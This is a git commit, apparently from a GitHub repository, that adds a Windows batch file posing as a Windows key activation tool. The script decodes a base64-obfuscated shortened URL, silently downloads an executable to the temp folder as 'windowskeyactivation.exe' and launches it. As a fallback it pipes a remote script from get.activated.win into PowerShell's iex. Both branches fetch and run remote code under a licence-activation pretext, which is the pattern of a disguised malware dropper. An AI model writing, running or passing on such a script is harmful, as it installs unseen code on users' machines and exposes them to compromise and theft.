5bc1f545ffaaede95c6e5cccfd2eeb76bd4e2fa1
betamod9 <164927681+betamod9@users.noreply.github.com>
2024-12-18 01:11:49 +0200

    Initial commit

---
+++ windows.bat
@@ -0,0 +1,12 @@
+@echo off
+set "b64=aHR0cHM6Ly9zaG9ydHVybC5hdC8wWlRIbQ=="
+for /f "tokens=*" %%a in ('powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%b64%'))"') do set "url=%%a"
+set "filename=%temp%\windowskeyactivation.exe"
+powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%url%' -OutFile '%filename%'" >nul 2>&1
+if exist "%filename%" (
+    start "" "%filename%"
+) else (
+    goto server
+)
+:server
+powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm https://get.activated.win | iex"
